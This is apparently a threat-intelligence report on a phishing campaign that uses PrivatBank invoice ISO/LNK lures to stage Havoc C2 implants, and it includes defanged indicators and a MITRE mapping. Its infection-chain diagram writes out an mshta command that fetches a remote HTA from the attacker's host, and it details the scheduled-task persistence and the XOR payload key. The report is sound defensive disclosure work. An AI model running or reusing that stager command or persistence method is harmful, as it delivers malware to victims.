---
title: "Dissecting PrivatBank Phishing Lures and Havoc C2 Staging at 93[.]152[.]223[.]39"
description: "Technical teardown of exposed ISO/LNK lures, scheduled task persistence hijacking, and Havoc C2 Demon in-memory injection."
publishedAt: 2026-08-16
archiveSection: reports
tags:
  - "threat-intelligence"
  - "dfir"
  - "havoc-c2"
  - "phishing"
cover: "/images/posts/exposed-quickdav-malware-distribution-repository-and-remcos-rat-infrastructure/img-01.png"
featured: true
draft: false
---

### Executive Summary

Analysis of exposed operational directory telemetry at `93[.]152[.]223[.]39:8089` identified an active malware delivery campaign leveraging Ukrainian PrivatBank financial lures (`Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso`) to stage **Havoc C2 Demon** implants.

---

### 1. Delivery Chain & Persistence Architecture

The operator's internal lab notes reveal the complete infection sequence:

```
ISO -> LNK -> cmd.exe -> PowerShell(B64+XOR90) -> mshta http://93[.]152[.]223[.]39:8089/win.hta?id=1
  -> HTA: schtasks Microsoft\Windows\TextServicesFramework\MsCtfMonitor
       ONLOGON + Hidden flag + XOR shellcode akt1842.dat in RAM -> Havoc C2 Demon
```

1. **Malicious Lure**: User mounts `Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso` and opens `Payment invoice INV-15468869 13.08.2026 PrivatBank.pdf.lnk`.
2. **Scheduled Task Hijacking**: Uses COM object `Schedule.Service` to register a hidden task under `Microsoft\Windows\TextServicesFramework\MsCtfMonitor` triggered on `ONLOGON`.
3. **Payload Decryption**: Downloads `akt1842.dat` and decrypts it using multi-byte XOR key `K7mQ2pL9`.
4. **In-Memory Injection**: Utilizes dynamic C# P/Invoke compilation (`DocFix`) to invoke `VirtualAlloc` and `CreateThread`.

---

### 2. Dual C2 Infrastructure Architecture

Telemetry indicates the backend runs dual services defined in `lab_rti_https.py`:
* **Port 8089 (HTTP)**: Unencrypted payload and HTA delivery endpoint.
* **Port 9443 (HTTPS)**: Encrypted TLS channel utilizing custom `lab.crt` for Havoc Demon agent callbacks.

---

### 3. Indicators of Compromise (Defanged)

| Indicator Type | Defanged Value / Cryptographic Hash | Operational Role |
|---|---|---|
| **Staging Host IPv4** | `93[.]152[.]223[.]39` | Primary C2 & Payload Staging Server |
| **HTTP Delivery Port** | `93[.]152[.]223[.]39:8089` | Cleartext HTA & Shellcode Hosting |
| **HTTPS C2 Port** | `93[.]152[.]223[.]39:9443` | TLS Encrypted Havoc Demon Callback |
| **Dropper URL** | `hxxp://93[.]152[.]223[.]39:8089/win.hta?id=1` | Initial MSHTA Stager Script |
| **Payload URL** | `hxxp://93[.]152[.]223[.]39:8089/akt1842.dat` | Encrypted Havoc Demon Shellcode |
| **SHA-256 (Shellcode)** | `c21f506d522cf1113d20374a62582d0b328d80335a301d71dfcf3cbd18baee81` | `akt1842.dat` |
| **SHA-256 (MSHTA)** | `cb8e5203b223994e242f64100404d643766b4b5d00c1ea94f63005e021464e01` | `win.hta` |
| **SHA-256 (LNK Lure)** | `1ae234657735420a453f4b307995794e4313b46bd1fcf96a34b523c03d1cc825` | `Payment invoice PrivatBank.pdf.lnk` |
| **SHA-256 (SSL Cert)** | `09ada70d8bbeba035e7b8085d14c3026256ec0f6b44d79c6750b9e3bca421a42` | `lab.crt` (C2 SSL Certificate) |
| **XOR Decryption Key** | `K7mQ2pL9` (Hex: `4b376d5132704c39`) | Multi-byte XOR Payload Key |
| **Persistence Key** | `Microsoft\Windows\TextServicesFramework\MsCtfMonitor` | Scheduled Task COM Hijack |

---

### 4. MITRE ATT&CK Mapping

* **T1566.001**: Spearphishing Attachment (PrivatBank ISO/LNK Lures)
* **T1204.002**: User Execution: Malicious File
* **T1218.005**: System Binary Proxy Execution: Mshta
* **T1053.005**: Scheduled Task/Job: Scheduled Task (`MsCtfMonitor`)
* **T1055**: Process Injection (In-memory P/Invoke `CreateThread`)
* **T1140**: Deobfuscate/Decode Files or Information (Multi-byte XOR)
* **T1071.001**: Application Layer Protocol: Web Protocols (Port 8089 & 9443)
